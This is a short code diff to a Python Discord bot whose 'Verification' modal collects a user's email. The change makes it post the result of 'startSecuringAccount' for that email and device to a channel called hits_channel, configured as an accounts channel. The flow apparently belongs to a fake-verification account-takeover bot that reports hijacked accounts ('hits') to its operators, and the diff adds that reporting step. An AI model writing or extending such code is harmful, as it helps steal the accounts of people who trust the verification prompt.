@@ -22,13 +22,14 @@ class MyModalOne(ui.Modal, title="Verification"):
     async def on_submit(self, interaction: discord.Interaction, /) -> None: 
         # Check if email is valid
         if re.compile(r"^[\w\.-]+@[\w\.-]+\.\w{2,}$").match(self.email.value) is None:
-            interaction.response.send_message(
+            await interaction.response.send_message(
                 "❌ Invalid Email. Make sure you entered your email correctly!",
                 ephemeral = True
             )
             return
 
         logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
+        hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
 
         await interaction.response.defer()
 
@@ -208,8 +209,10 @@ class MyModalOne(ui.Modal, title="Verification"):
                     )
 
                     # Securing
-                    startSecuringAccount(self.email.value, device) 
-                    
+                    embed = startSecuringAccount(self.email.value, device) 
+                    await hits_channel.send(
+                        embed = embed
+                    )
                     return
                 
                 time.sleep(1)
